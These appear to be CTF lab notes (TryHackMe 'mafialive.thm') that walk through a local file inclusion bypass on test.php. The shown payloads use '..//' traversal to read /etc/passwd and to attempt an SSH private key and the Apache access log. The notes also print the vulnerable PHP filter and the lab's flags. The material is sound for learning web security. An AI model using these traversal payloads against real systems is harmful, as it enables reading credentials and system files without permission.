http://10.10.93.86/

![[web80.png]]

alternate DNS found

```
mafialive.thm
```

adding to /etc/hosts

```
10.10.93.86     mafialive.thm
```


http://mafialive.thm

![[dns80.png]]

```
thm{f0und_th3_r1ght_h0st_n4m3}
```


http://mafialive.thm/robots.txt


```
User-agent: *  
Disallow: /test.php
```

http://mafialive.thm/test.php

![[test.php.png]]

![[clickbutton.png]]

provides a new link in browser bar

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```


trying to view http://mafialive.thm/test.php?view=/etc/passwd

```
Sorry, Thats not allowed
```

this is the code of test.php web page

```
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="[/test.php?view=/var/www/html/development_testing/mrrobot.php](view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php)"><button id="secret">Here is a button</button></a><br>
        Control is an illusion    </div>
</body>
```

```
https://highon.coffee/blog/lfi-cheat-sheet/
```

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```


we see an archangel user

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../home/archangel/.ssh/id_rsa
```

did not work

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log
```

view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log


http://mafialive.thm/test.php

```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

```